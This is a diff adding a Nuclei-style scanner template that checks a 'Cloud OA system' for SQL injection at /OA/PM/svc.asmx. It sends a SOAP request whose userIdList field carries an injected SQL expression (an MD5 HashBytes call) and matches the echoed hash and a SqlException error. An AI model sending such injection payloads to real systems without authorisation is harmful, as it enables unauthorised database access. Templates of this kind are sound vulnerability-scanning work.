@@ -1,0 +1,42 @@
+id: cloud-oa-system-sqli
+
+info:
+  name: Cloud OA system SQLi
+  author: SleepingBag945
+  severity: high
+  description: cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.
+  tags: cloudoa,sqli
+
+http:
+  - raw:
+      - |
+        POST /OA/PM/svc.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+        Content-Type: text/xml
+        Accept-Encoding: gzip, deflate
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetUsersInfo xmlns="http://tempuri.org/">
+              <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{randstr}}'),2))</userIdList>
+            </GetUsersInfo>
+          </soap:Body>
+        </soap:Envelope>
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "System.Data.SqlClient.SqlException"
+          - "<?xml version="
+          - "{{md5('{{randstr}}')}}"
+        condition: and
+
+      - type: status
+        status:
+          - 500
+
